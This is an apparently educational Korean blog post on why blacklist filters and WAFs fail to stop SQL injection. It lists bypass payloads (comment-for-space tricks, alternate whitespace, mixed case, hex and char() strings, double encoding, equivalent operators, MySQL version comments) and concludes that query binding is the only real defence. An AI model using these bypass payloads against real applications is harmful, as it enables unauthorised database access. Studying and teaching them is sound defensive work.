---
title: "SQLi 필터·WAF 우회의 한계"
date: 2026-10-15 09:00:00 +0900
categories: [Web Security, SQL Injection]
tags: [sql-injection, waf, filter-bypass, web]
description: "키워드·공백 블랙리스트가 SQL 인젝션을 못 막는 이유와, 공백·주석·대소문자·인코딩·동치표현 우회 구문, 그리고 바인딩만이 근본 방어인 점을 정리합니다."
mermaid: true
---

> 기본 개념은 [SQL 인젝션](/notes/sql-injection/)에서 다뤘다. 이 글은 **키워드·공백 블랙리스트가 왜 못 막는가**를 본다. 결론은 하나다 — 블랙리스트는 표현 변형을 못 따라가고, 유일한 근본 방어는 바인딩이다.

## 개념

WAF·필터는 "위험해 보이는 문자열"을 거른다. 그러나 SQL은 같은 의미를 수없이 다른 표기로 쓸 수 있어, 금지어 하나가 빠지면 뚫린다. 필터는 보조 수단이고, 입력이 쿼리에 문자열로 결합되는 **구조 자체**가 원인이다.

```sql
' OR '1'='1          -- 차단되면 ↓
'/**/OR/**/'1'/**/='1   -- 공백을 주석으로, 키워드 분해
```

## 공격·우회 구문

허가된 범위에서만. 필터가 무엇을(공백/키워드/따옴표) 어떻게(삭제/거부/치환) 거르는지 먼저 파악한다.

### 공백 우회

```
/**/          주석으로 공백 대체
+             (URL 인코딩 문맥)
%09 %0a %0b %0c %0d %a0   탭·개행·비표준 공백
()            SELECT(a)FROM(b)
```

### 키워드·대소문자

```
SeLeCT / UNiOn            대소문자 혼합(필터가 대소문자 구분 시)
UNIONUNION SELECTSELECT   삭제형 치환: 'UNION' 1회 제거 후 재조합
SEL/**/ECT                주석으로 키워드 분할
```

### 따옴표 회피

```
숫자 문맥: id=1 OR 1=1 (따옴표 불필요)
0x61646d696e             문자열을 16진수로 (MySQL)
char(97,100,109,105,110) 문자 코드 조합
```

### 인코딩·동치표현

```
%27 → '      URL 인코딩 / %2527 이중 인코딩
OR 1=1 대신:  OR 2>1 , OR 'a'='a' , OR 1 LIKE 1
AND 대신:     && ,  OR 대신 ||  (MySQL)
= 대신:       LIKE , IN , BETWEEN , REGEXP
주석:         -- - , # , /*!50000 ... */ (MySQL 버전 주석 — 실행됨)
```

### 확인 요령

```
한 변형이 막히면 '필터가 본 표기'를 바꿔 재시도 — 우회 값 수집보다 '거르는 방식' 추정이 빠름
```

## 참고 자료

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
